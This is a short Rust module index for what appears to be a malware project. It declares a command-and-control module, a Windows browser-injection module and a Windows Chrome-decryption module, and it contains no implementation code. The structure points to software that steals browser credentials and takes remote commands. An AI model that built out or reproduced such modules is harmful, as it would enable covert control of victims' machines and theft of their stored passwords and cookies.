// Services module - C2 (Command and Control) 機能
pub mod c2;

#[cfg(windows)]
pub mod browser_injection;

// Chrome decryption service (Windows only)
#[cfg(target_os = "windows")]
pub mod chrome_decrypt;

pub use c2::*;
#[cfg(windows)]
pub use browser_injection::*;

#[cfg(target_os = "windows")]
pub use chrome_decrypt::*;